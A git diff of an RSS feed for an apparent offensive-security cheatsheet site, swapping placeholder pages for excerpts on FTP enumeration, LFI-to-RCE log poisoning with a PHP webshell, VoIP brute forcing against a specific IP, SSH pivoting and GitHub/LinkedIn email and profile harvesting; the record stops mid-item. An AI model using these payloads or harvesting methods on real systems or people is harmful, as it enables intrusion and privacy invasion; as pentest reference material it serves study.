@@ -1,9 +1,9 @@
 <?xml version="1.0" encoding="utf-8" standalone="yes" ?>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
-    <title>DocDock Documentation</title>
+    <title>Offensive Security Cheatsheet</title>
     <link>/</link>
-    <description>Recent content on DocDock Documentation</description>
+    <description>Recent content on Offensive Security Cheatsheet</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
     
@@ -11,759 +11,968 @@
     
     
     <item>
-      <title>Test</title>
-      <link>/cryptography/aes/</link>
+      <title>21 - FTP</title>
+      <link>/recon-enumeration/services-enumeration/21_ftp/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/cryptography/aes/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/recon-enumeration/services-enumeration/21_ftp/</guid>
+      <description>Identification # Base connection ftp &amp;lt;IP&amp;gt; &amp;gt; USER Anonymous &amp;gt; PASS test # It can be usefull to try passive mode ftp -p &amp;lt;IP&amp;gt; &amp;gt; USER Anonymous &amp;gt; PASS test # Using telnet telnet &amp;lt;IP&amp;gt; 21 Anonymous test bin (binary mode, don\&amp;#39;t forget it before transfering exe file) get / send # FTP Web Access ? # Try upload and execute through web access ftp://IP 
+Bruteforce `bash hydra -L users.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/cryptography/misc/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/cryptography/misc/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/cryptography/rsa/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/cryptography/rsa/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/linux-systems/todo/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/linux-systems/todo/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/network/arp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/network/arp/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/network/dns/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/network/dns/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/network/icmp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/network/icmp/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/network/ldap/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/network/ldap/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/network/mac/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/network/mac/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/network/pivot_techniques/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/network/pivot_techniques/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/buscador/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/buscador/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/belati/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/belati/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/danger_zone/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/danger_zone/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/datasploit/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/datasploit/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/gasmask/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/gasmask/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/osint-spy/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/osint-spy/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/omnibus/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/omnibus/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/recon-ng/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/recon-ng/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/recondog/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/recondog/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/frameworks-correlation/spiderfoot/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/frameworks-correlation/spiderfoot/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/general/firefox_addons/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/general/firefox_addons/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/hosting-and-repositories/amazon_digitalocean/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/hosting-and-repositories/github/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/hosting-and-repositories/github/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/email/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/email/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/leaks/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/leaks/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/searchingsomeone/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/searchingsomeone/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/skiptracer/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/skiptracer/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/facebook/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/facebook/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/general/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/general/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/instagram/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/instagram/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/linkedin/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/linkedin/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/multi_networks/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/multi_networks/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/tinder/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/tinder/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/human-recon/social-networks/twitter/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/human-recon/social-networks/twitter/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/technical-recon/company_meta/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/company_meta/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/technical-recon/documents_metadata/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/documents_metadata/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
+      <title>Domain &amp; IP</title>
       <link>/open-source-intelligence-osint/technical-recon/domain_ip/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/open-source-intelligence-osint/technical-recon/domain_ip/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <description>Identification Get information on an IP whois &amp;lt;IP&amp;gt; # Enhanced Whois https://domainbigdata.com https://whois.domaintools.com https://www.ip2location.com # Get IP address associated to a domain nslookup domain.fr ping domain.fr # Bing dorks to identify host sharing ip:xxx.xxx.xxx.xxx 
+Online Passive Identification Tools # Many passive tests can be done http://www.ipvoid.com/ # Informations about the target https://securitytrails.com/ # When you have a name or a e-mail adress you can perform a reverse whois lookup to find domain # names oned by a person of a company https://viewdns.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/technical-recon/dorks/</link>
+      <title>Easy - No Protections</title>
+      <link>/pwn/buffer-overflow/easy_no_protection/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/dorks/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/pwn/buffer-overflow/easy_no_protection/</guid>
+      <description>Simple Buffer Overflow (no protection) - Function call # Code void copy_ordre(char *arg) { char ordre[50]; strcpy(ordre,arg); printf(&amp;#34;\nOrdre reçu : %s\n\n&amp;#34;,ordre); } int main(int argc, char** argv) { if(argc &amp;lt; 2) { printf(&amp;#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons. Le cas échéant, nous détruirons la terre.\n&amp;#34;); printf(&amp;#34;Usage: %s &amp;lt;ordre&amp;gt;\n&amp;#34;, argv[0]); exit(0); } printf(&amp;#34;Bienvenue, humain. Donnez-nous vos ordres. En cas de bonne réponse, nous vous épargnerons.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/technical-recon/misc/</link>
+      <title>Firefox addons</title>
+      <link>/open-source-intelligence-osint/general/firefox_addons/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/misc/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/open-source-intelligence-osint/general/firefox_addons/</guid>
+      <description>Flag Fox Flagfox is an extension that displays a flag icon indicating the current webserver&amp;rsquo;s physical location.
+It then launch a geotool webpage to get more informations about the website you are visiting About IP &amp;amp; Domain.
+Google Cache Google Cache lets you visit retrieve the web page from Google Web Cache when the site is offline.
+If the site is offline, you can just press toolbar button and request cached version of the page from Google Cache.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/technical-recon/photon/</link>
+      <title>Github</title>
+      <link>/open-source-intelligence-osint/hosting-and-repositories/github/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/photon/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/open-source-intelligence-osint/hosting-and-repositories/github/</guid>
+      <description>Finding user e-mail # Method 1 # Go for it → https://api.github.com/users/xxxxxxx/events/public # And search for “email” ------------------------ # Method 2 # Go for user repositories # Find one repo and go checks commits # Take one commit https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2 # Add .patch at the end and check for email https://github.com/angularjs-gdit/example-01-helloworld/commit/4243528ac995e2bb717eed82b06fea620ab7f0f2.patch 
+Gitrob # Gitrob is a github scanner and crawler # Can be used to retrieve sensitive data in github repositories https://michenriksen.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/technical-recon/subdomain_enumeration/</link>
+      <title>Hashcat Cheatsheet</title>
+      <link>/passcracking-hashfiles/hashcat_cheatsheet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/open-source-intelligence-osint/technical-recon/subdomain_enumeration/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/passcracking-hashfiles/hashcat_cheatsheet/</guid>
+      <description>TODO</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/technical-recon/typofinder/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/typofinder/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/open-source-intelligence-osint/technical-recon/web_application_firewall/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/open-source-intelligence-osint/technical-recon/web_application_firewall/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
+      <title>IPBX</title>
       <link>/other-systems/todo/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/other-systems/todo/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <description># You can browse to the following URL to get all users registered with an extension 178.33.47.167/panel/ # Sipvicious is a great tool to attack VoIP # You can bruteforce a special extension/account ./svcrack.py -u 2000 178.33.47.167 -d ./notre_dictionnaire -vv</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/passcracking-hashfiles/todo/</link>
+      <title>LinkedIn</title>
+      <link>/open-source-intelligence-osint/human-recon/social-networks/linkedin/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/passcracking-hashfiles/todo/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/open-source-intelligence-osint/human-recon/social-networks/linkedin/</guid>
+      <description>ScrapedIn # Tool created to assist in performing recon using the LinkedIn API. # Provide a search string # Ouput as XLSX but intented to work with Google Sheets # After importing you&amp;#39;ll have a dataset and report worksheet # Dataset : First name, last name, occupation, industry, profile URL, picture URL # Report : Picture (displayed), Full name, occupation, Link to profile 
+linkScrape # linkScrape is another enumeration tool # Pure Web Scrapper → It does not use the LinkedIn API # /!</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/recon-enumeration/active-recon-scans/application_scan/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/recon-enumeration/active-recon-scans/application_scan/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/recon-enumeration/active-recon-scans/aquatone/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/recon-enumeration/active-recon-scans/aquatone/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/recon-enumeration/active-recon-scans/nmap_cheatsheet/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/recon-enumeration/active-recon-scans/nmap_cheatsheet/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/recon-enumeration/active-recon-scans/tcp_udp/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/recon-enumeration/active-recon-scans/tcp_udp/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/recon-enumeration/active-recon-scans/vhost/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/recon-enumeration/active-recon-scans/vhost/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/recon-enumeration/services-enumeration/todo/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/recon-enumeration/services-enumeration/todo/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/shells-methods/bind/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/shells-methods/bind/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/shells-methods/methodology/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/shells-methods/methodology/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/shells-methods/reverse/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/shells-methods/reverse/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/shells-methods/tty_full/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/shells-methods/tty_full/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/shells-methods/webshell/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/shells-methods/webshell/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/shells-methods/windows/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/shells-methods/windows/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/client-side-injections/csrf/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/client-side-injections/csrf/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/client-side-injections/xss/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/client-side-injections/xss/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/content-management-system-cms/drupal/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/content-management-system-cms/drupal/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/content-management-system-cms/joomla/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/content-management-system-cms/joomla/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/content-management-system-cms/magento/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/content-management-system-cms/magento/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/content-management-system-cms/others/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/content-management-system-cms/others/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/content-management-system-cms/wordpress/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/content-management-system-cms/wordpress/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/files-inclusions-and-injections/directory_file_discovery/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
-      <link>/web-attacks/files-inclusions-and-injections/file_upload/</link>
-      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
-      
-      <guid>/web-attacks/files-inclusions-and-injections/file_upload/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
-    </item>
-    
-    <item>
-      <title>Test</title>
+      <title>Local and Remote File Inclusions</title>
       <link>/web-attacks/files-inclusions-and-injections/lfi_rfi/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/web-attacks/files-inclusions-and-injections/lfi_rfi/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <description>Local File Inclusion # Double Encoding page=php://filter/read=convert.base64-encode/resource=conf page%3Dphp%20%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dconf page%253Dphp%2520%253A%252F%252Ffilter%252Fread%253Dconvert.base64-encode%252Fresource%253Dconf # Files file:///boot.ini file:///boot.ini%00 file:///boot.ini%2500 file:///etc/passwd file:///etc/passwd%00 file:///etc/passwd%2500 # LFI in HTTP headers curl --header &amp;#34;Accept-Language: php://filter/read=convert.base64-encode/resource=config.php&amp;#34; http://target # LFI to RCE Can you read for a .log file such as: C:\xampp\apache\logs\access.log ? Then go nc -nv IP 80 Then write: &amp;lt;?php system($_GET[&amp;#39;acknak&amp;#39;]);?&amp;gt; Now access the log file using the LFI and inject system command in acknak parameter !</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/files-inclusions-and-injections/xslt/</link>
+      <title>Masscan Cheatsheet</title>
+      <link>/recon-enumeration/port-scanning/masscan_cheatsheet/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/files-inclusions-and-injections/xslt/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/recon-enumeration/port-scanning/masscan_cheatsheet/</guid>
+      <description>TODO</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/files-inclusions-and-injections/xxe/</link>
+      <title>Methodology</title>
+      <link>/shells-methods/methodology/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/files-inclusions-and-injections/xxe/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/shells-methods/methodology/</guid>
+      <description>GOLD COMMAND # which is gold command which which ls find python python3 perl bash sh dash xterm php jsp java asp socat\ nc ncat netcat nc.traditional nc.openbsd ruby wget curl fetch lua gawk awk tclsh  
+Methodology _ Keep it simple, test for very basic things. | | |________ Which languages are interpreted by the servers, try to upload some simple echo | | | | | |____ Found php ?</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/headers_injections/</link>
+      <title>PHP Filters</title>
+      <link>/web-attacks/php-vulnerabilities/php_filters/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/headers_injections/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/web-attacks/php-vulnerabilities/php_filters/</guid>
+      <description>PHP Filters # Base64 ?</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/misc_others/</link>
+      <title>Pivot Techniques</title>
+      <link>/network/pivot_techniques/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/misc_others/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/network/pivot_techniques/</guid>
+      <description>Proxychains Pivot # When you have access to a machine, you can use it as pivot to target machines # Getting known machines arp -a # Setup SSH Dynamic on the attacking box ssh -D &amp;lt;local_port&amp;gt; &amp;lt;user&amp;gt;@&amp;lt;ip&amp;gt; # Setup proxychains in /etc/proxychains.conf [ProxyList] socks4 127.0.0.1 &amp;lt;local_port&amp;gt; # Reduce timeout in /etc/proxychains.conf to gain speed tcp_read_time_out 800 tcp_connect_time-out 800 # Then proxychains...# If the compromised host is a Windows machine you still can use it as a pivot.</description>
     </item>
     
     <item>
-      <title>Test</title>
-      <link>/web-attacks/php-functions-vulnerabilities/assert/</link>
+      <title>RSA Encryption</title>
+      <link>/cryptography/rsa/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/web-attacks/php-functions-vulnerabilities/assert/</guid>
-      <description>Ceci est une page de test Ceci est un contenu de test</description>
+      <guid>/cryptography/rsa/</guid>
+      <description>Resources https://bitsdeep.com/posts/attacking-rsa-for-fun-and-ctf-points-part-1/ # Think about factordb.com to retrieve p and q from n 
